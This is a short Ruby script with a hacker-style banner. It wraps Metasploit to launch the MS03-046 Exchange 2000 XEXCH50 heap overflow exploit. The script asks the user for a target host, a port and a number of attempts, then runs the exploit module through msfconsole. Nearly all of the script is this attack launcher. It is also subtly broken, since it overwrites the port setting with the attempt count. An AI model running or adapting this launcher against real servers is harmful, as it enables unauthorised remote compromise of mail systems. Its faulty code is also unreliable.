require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
       Exchange 2000 XEXCH50 Heap Overflow
""".red
puts """
	 1st Try {set RPORT 25; 2nd RPORT 465}""".white



puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] How many tries you wana have at it? ".blue
puts " [?] 10  50  100  250  500  1000  1500 ? ".blue
print " [!] ---> ".yellow
attempt = gets.chomp

exec("msfconsole -x 'use exploit/windows/smtp/ms03_046_exchange2000_xexch50' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg RPORT #{attempt}' -x 'run'")

